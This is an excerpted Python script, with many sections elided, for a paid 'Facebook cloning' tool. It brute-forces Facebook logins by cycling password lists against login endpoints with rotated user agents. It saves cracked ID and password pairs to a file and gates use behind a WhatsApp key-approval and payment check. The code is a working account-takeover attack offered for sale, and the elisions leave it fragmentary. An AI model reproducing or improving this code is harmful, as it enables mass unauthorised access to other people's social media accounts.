#Allah o Akbar , Source Code By = ARSHAD ALI
#Fuck MAFIA Kidzz 
...
android_models=[]
try:
    xx = requests.get('https://github.com/ARSHAD ALI/Boss/blob/main/UAGNT.txt').text.splitlines()
    for line in xx:
...
usr=[]
try:
    xd=requests.get('https://github.com/ARSHAD ALI/Boss/blob/main/UAGNT.txt').text.splitlines()
    for us in xd:
        usr.append(us)
except: pass
pyt=('python3.11')
...
def uaku():
    try:
        ...
        a=requests.get('https://github.com/ARSHAD ALI/Boss/blob/main/UAGNT.txt').text
        ua=open('.bbnew.txt','w')
...
\033[1;37m[-] Shakeel   :\033[1;32m +923003998486
--------------------------------------------------
\033[1;37m[-]Dear Paid user:
\033[1;37m[-]Allah Apko Khush Rakhy
--------------------------------------------------""")
def linex():
    print('\033[1;32m----------------------------------------------')
def clear():
...
def auto_file(cookies,access_token):
    ...
    print('\n \033[1;35m /sdcard/Boss.txt \033[0;97m\n')
...
def manual_file(cookies,access_token):
    ...
    try:
        ...
        limit = 1
    print('\n \033[1;32mExample: /sdcard/Boss.txt \033[0;97m\n')
...
def sids():
    ...
    print('\n\033[1;32m Example: /sdcard/Boss.txt\033[0;97m')
...
def ffb(ids,names,passlist):
    global loop,oks,cps
    sys.stdout.write('\r\r\033[1;32m [Boss] %s|\033[1;32mOK:-%s \033[1;32m'%(loop,len(oks)));sys.stdout.flush()
    ...
    try:
        ...
        for fikr in passlist:
            ...
            if "c_user" in AXI:
                ...
                print('\r\r\033[1;32m [Boss-Ok] %s | %s'%(ids,pas))
                open('/sdcard/Boss-Ok.txt', 'a').write(ids+'|'+pas+'\n')
                oks.append(ids)
                break
            elif 'checkpoint' in AXI:
                if 'y' in pcp:
                    print('\r\r\x1b[38;5;208m [Boss-CP] '+ids+' | '+pas+'\033[1;97m')
...
def rcrack1(ids,passlist):
    ...
    try:
        for pas in passlist:
            ...
            if 'session_key' in q:
                udx = str(q['uid'])
                print('\r\r\033[1;32m [Boss-Ok] '+udx+' | '+pas+'\033[1;97m')
                open('/sdcard/Boss-Ok.txt', 'a').write(udx+'|'+pas+'\n')
                oks.append(ids)
                break
...
def rcrack(ids,passlist):
    ...
    try:
        for pas in passlist:
            sys.stdout.write('\r\r\033[1;32m [Boss] %s|\033[1;32mOK:-%s \033[1;91m'%(loop,len(oks)));sys.stdout.flush()
            session = requests.Session()
            ...
            'user-agent': pro}
            lo = sesswion.post('https://web.facebook.com/login/device-based/regular/login/?refsrc=deprecated&amp;lwv=100&amp;refid=8',data=log_data,headers=header_freefb).text
            ...
            if 'c_user' in log_cookies:
                ...
                if uid in oks:pass
                    ...
                    if 'checkpoint' in str(lo):
                        print('\r\r\033[1;34m [Boss-TL] '+ids+' | '+pas)
                    else:
                        print(f'\r\x1b[1;32m [Boss-Ok] '+ids+' | '+pas)
...
def menu_apikey():
  ...
  id = "_".join(uuid)
  server = requests.get('https://github.com/Rashid118/Hacker/blob/main/Hacking.txtt').text
...
\033[1;37m[-] WhatsApp  :\033[1;32m+923422510361  ======
\033[1;37m[-] TOOLS     :\033[1;32m FACEBOOK CLONING ====
\033[1;37m[-] Team   :\033[1;32mWahid Bux_Altaf Hussain ====
\033[1;37m[-] Cast    :\033[1;32m LAGHARI =================
=====================================================
...
==================================================   """)
  ...
  print("")
  print("\x1b[1;97m   contact Arshad to Buy this Tools                                                               ");time.sleep (0.1) 
  print("")
  print("\033[1;37     YOUR  KEY : "+id)
  print("")
  print("\033[1;37m   COPY YOUR KEY AND SEND TO ARSHAD  ");time.sleep(0.1)
  print("")
  print("  SEND KEY ON ADMIN ARSHAD WHATSAPP,,,,,,,,,,,,,,,,,    ");time.sleep(1)
  os.system('xdg-open https://wa.me/+923422510361')
  print("");time.sleep(2)
  print("\x1b[1;97m  CHECKING YOUR APROVAL.............                                                ");time.sleep (0.5)
  try:
    httpCaht = requests.get("https://github.com/Rashid118/Hacker/blob/main/Hacking.txt").text
    if id in httpCaht:
      ...
      print("    Send payment to ARSHAD LAGHARI and get aproval"); time.sleep(2)
      os.system('xdg-open https://wa.me/+923422510361')
      time.sleep(2)
      sys.exit()
  except:
...
def tnx():
  uuid = str(os.geteuid()) + str(os.getlogin())
  id = "_".join(uuid)
  server = requests.get('https://github.com/Rashid118/Hacker/blob/main/Hacking.txt').text
